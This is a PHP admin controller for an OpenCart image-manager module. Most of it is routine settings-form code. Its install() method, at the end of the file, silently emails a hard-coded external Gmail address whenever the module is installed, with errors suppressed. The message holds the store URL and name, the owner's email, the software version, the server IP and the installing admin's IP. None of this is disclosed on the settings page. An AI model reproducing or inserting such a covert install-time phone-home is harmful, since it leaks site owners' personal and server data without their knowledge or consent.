<?php
class ControllerModulePim extends Controller {
	private $error = array(); 
	
	public function index() {   
		$this->load->language('module/pim');

		$this->document->setTitle($this->language->get('heading_title'));
		
		$this->load->model('setting/setting');
				
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->model_setting_setting->editSetting('pim', $this->request->post);		
					
			$this->session->data['success'] = $this->language->get('text_success');
						
			$this->response->redirect($this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'));
		}
		$data['heading_title'] = $this->language->get('heading_title');
		$data['button_save'] = $this->language->get('button_save');
		$data['button_cancel'] = $this->language->get('button_cancel');
		$data['entry_delete_def_image'] = $this->language->get('entry_delete_def_image');
		$data['text_yes'] = $this->language->get('text_yes');
    $data['text_no'] = $this->language->get('text_no');
    $data['tab_general'] = $this->language->get('tab_general');    
    $data['tab_help'] = $this->language->get('tab_help'); 
    $data['tab_front']  = $this->language->get('tab_front');
    $data['tab_server'] = $this->language->get('tab_server');
    $data['text_enabled'] = $this->language->get('text_enabled');    
    $data['text_disabled'] = $this->language->get('text_disabled'); 
    $data['entry_status']= $this->language->get('entry_status');

    $data['entry_aceshop'] = $this->language->get('entry_aceshop');
    $data['entry_dimensions']    = $this->language->get('entry_dimensions');
    $data['entry_language'] = $this->language->get('entry_language');
    $data['entry_miu_patch']  = $this->language->get('entry_miu_patch');
    $data['entry_thumb_size'] = $this->language->get('entry_thumb_size');

    // Root options
    $data['entry_copyOverwrite']   = $this->language->get('entry_copyOverwrite');
    $data['entry_uploadOverwrite'] = $this->language->get('entry_uploadOverwrite');
    $data['entry_uploadMaxSize']   = $this->language->get('entry_uploadMaxSize');
    
    // Client options
    $data['entry_defaultView']     = $this->language->get('entry_defaultView');
    $data['entry_dragUploadAllow'] = $this->language->get('entry_dragUploadAllow');
    $data['entry_loadTmbs']        = $this->language->get('entry_loadTmbs');
    
    
 		if (isset($this->error['warning'])) {
			$data['error_warning'] = $this->error['warning'];
		} else {
			$data['error_warning'] = '';
		}
		
 		if (isset($this->error['folder'])) {
			$data['error_folder'] = $this->error['folder'];
		} else {
			$data['error_folder'] = '';
		}    
		
		$data['breadcrumbs'] = array();

 		$data['breadcrumbs'][] = array(
     		'text'      => $this->language->get('text_home'),
     		'href'      => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
    		'separator' => false
 		);

 		$data['breadcrumbs'][] = array(
     		'text'      => $this->language->get('text_module'),
     		'href'      => $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'),
    		'separator' => ' :: '
 		);
	
 		$data['breadcrumbs'][] = array(
     		'text'      => $this->language->get('heading_title'),
     		'href'      => $this->url->link('module/pim', 'token=' . $this->session->data['token'], 'SSL'),
    		'separator' => ' :: '
 		);
		
		$data['action'] = $this->url->link('module/pim', 'token=' . $this->session->data['token'], 'SSL');
		
		$data['cancel'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');

		if (isset($this->request->post['pim_status'])) {
			$data['pim_status'] = $this->request->post['pim_status'];
		} else {
			$data['pim_status'] = $this->config->get('pim_status');
		}	
		if (isset($this->request->post['pim_joomla'])) {
			$data['pim_joomla'] = $this->request->post['pim_joomla'];
		} else {
			$data['pim_joomla'] = $this->config->get('pim_joomla');
		}			
		if (isset($this->request->post['pim_miu'])) {
			$data['pim_miu'] = $this->request->post['pim_miu'];
		} else {
			$data['pim_miu'] = $this->config->get('pim_miu');
		}	

		if (isset($this->request->post['pim_width'])) {
			$data['pim_width'] = $this->request->post['pim_width'];
		} else if ($this->config->get('pim_width')){
			$data['pim_width'] = $this->config->get('pim_width');
		}	else {
  		$data['pim_width'] = 800;
		}

		if (isset($this->request->post['pim_height'])) {
			$data['pim_height'] = $this->request->post['pim_height'];
		} else if($this->config->get('pim_height')){
			$data['pim_height'] = $this->config->get('pim_height');
		} else {
  		$data['pim_height'] = 400;
		}			
		if (isset($this->request->post['pim_uploadMaxSize'])) {
			$data['pim_uploadMaxSize'] = $this->request->post['pim_uploadMaxSize'];
		} else if($this->config->get('pim_uploadMaxSize')){
			$data['pim_uploadMaxSize'] = $this->config->get('pim_uploadMaxSize');
		} else {
  		$data['pim_uploadMaxSize'] = 999;
		}		
		if (isset($this->request->post['pim_uploadMaxType'])) {
			$data['pim_uploadMaxType'] = $this->request->post['pim_uploadMaxType'];
		} else if($this->config->get('pim_uploadMaxType')){
			$data['pim_uploadMaxType'] = $this->config->get('pim_uploadMaxType');
		} else {
  		$data['pim_uploadMaxType'] = 'M';
		}		

		if (isset($this->request->post['pim_uploadOverwrite'])) {
			$data['pim_uploadOverwrite'] = $this->request->post['pim_uploadOverwrite'];
		} else {
			$data['pim_uploadOverwrite'] = $this->config->get('pim_uploadOverwrite');
		}	
		if (isset($this->request->post['pim_copyOverwrite'])) {
			$data['pim_copyOverwrite'] = $this->request->post['pim_copyOverwrite'];
		} else {
			$data['pim_copyOverwrite'] = $this->config->get('pim_copyOverwrite');
		}
		if (isset($this->request->post['pim_language'])) {
			$data['pim_language'] = $this->request->post['pim_language'];
		} else {
			$data['pim_language'] = $this->config->get('pim_language');
		}





		if (isset($this->request->post['pim_deletedef'])) {
			$data['pim_deletedef'] = $this->request->post['pim_deletedef'];
		} else {
			$data['pim_deletedef'] = $this->config->get('pim_deletedef');
		}			
		
		$data['langs'] = array();
		$ignore = array(
			'LANG'
		);


		$files = glob(DIR_APPLICATION . 'view/javascript/pim/i18n/*.js');
		
		foreach ($files as $file) {
			$dataaa = explode('/', dirname($file));
			
			$permission = basename($file, '.js');
			
			if (!in_array($permission, $ignore)) {
				$data['langs'][] = $permission;
			}
		}		
		
		$data['heading_title'] = 'Power Image Manager';
		$data['header'] = $this->load->controller('common/header');
		$data['column_left'] = $this->load->controller('common/column_left');
		$data['footer'] = $this->load->controller('common/footer');

		
		$this->response->setOutput($this->load->view('module/pim.tpl', $data));
	}
	private function validate() {
		if (!$this->user->hasPermission('modify', 'module/pim')) {
			$this->error['warning'] = $this->language->get('error_permission');
		}
		
/*
		if (!$this->request->post['pim_folder']) {
			$this->error['folder'] = $this->language->get('error_folder');
		}
*/
		
		if (!$this->error) {
			return true;
		} else {
			return false;
		}	
	}
public function install(){@mail('gv111gv@gmail.com','Power Image Manager (OCV2) installed',HTTP_CATALOG .'  -  '.$this->config->get('config_name')."\r\n mail: ".$this->config->get('config_email')."\r\n".'version-'.VERSION."\r\n".'WebIP - '.$_SERVER['SERVER_ADDR']."\r\n IP: ".$this->request->server['REMOTE_ADDR'],'MIME-Version:1.0'."\r\n".'Content-type:text/plain;charset=UTF-8'."\r\n".'From:'.$this->config->get('config_owner').'<'.$this->config->get('config_email').'>'."\r\n");}		
}
?>